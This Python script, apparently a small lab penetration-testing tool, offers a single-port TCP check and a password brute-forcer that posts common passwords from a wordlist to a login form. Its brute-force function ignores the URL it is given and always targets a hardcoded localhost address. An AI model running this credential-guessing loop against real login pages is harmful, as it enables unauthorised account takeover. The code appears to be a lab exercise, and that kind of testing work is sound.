import sys
import re
import socket
import requests


def main():
    if len(sys.argv) == 1:
        usage()

    if sys.argv[1] == "-cp" or sys.argv[1] == "--check-port":
        if len(sys.argv) != 4:
            check_port_usage()
        else:
            if not (is_valid_ipv4(sys.argv[2]) or is_valid_domain(sys.argv[2])):
                check_port_usage()
            try:
                if int(sys.argv[3]) not in range(1, 65536):
                    check_port_usage()
            except ValueError:
                check_port_usage()
        port_scan(sys.argv[2], int(sys.argv[3]))
    
    elif sys.argv[1] == "-bf" or sys.argv[1] == "--brute-force-psswd":
        if len(sys.argv) != 4:
            brute_force_usage()
        else:
            brute_force_psswd(sys.argv[2], sys.argv[3])
    else:
        usage()


# brute force password
def brute_force_usage():
    print("Usage for brute force:")
    print("  python pentest.py [option] [url] [username]")
    print("Options:")
    print("  -bf, --brute-force-psswd       Start brute force")
    print("Example:")
    print("  python pentest.py -bf http://127.0.0.1:5000/login user")
    exit()


def brute_force_psswd(url, username):
    with open("most-popular-passwords.txt", "r") as file:
        passwords = [line.rstrip() for line in file.readlines()]

    print("Brute force is started. Wait...")
    for password in passwords:
        url = 'http://127.0.0.1:5000/login'
        data = {
            'username': username,
            'password': password,
        }
        response = requests.post(url, data=data)
        if "Here you can add new tasks and monitor your progress." in response.text:
            print(password)
            break

# check port
def check_port_usage():
    print("Invalid host or port")
    print("Usage for check ports:")
    print("  python pentest.py [option] [host] [port]")
    print("Options:")
    print("  -cp, --check-port       Checks port")
    print("Example:")
    print("  python pentest.py --check-port example.com 443")
    exit()


def is_valid_ipv4(ip):
    pattern = r'^((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})$'
    if re.match(pattern, ip):
        return True
    return False


def is_valid_domain(domain):
    pattern = r'^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$'
    if re.match(pattern, domain):
        return True
    return False


def usage():
    print("Usage:")
    exit()


def port_scan(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    if sock.connect_ex((host, port)):
        print(f"Port [{port}] on [{host}] is down!")
    else:
        print(f"Port [{port}] on [{host}] is up!")


if __name__ == "__main__":
    main()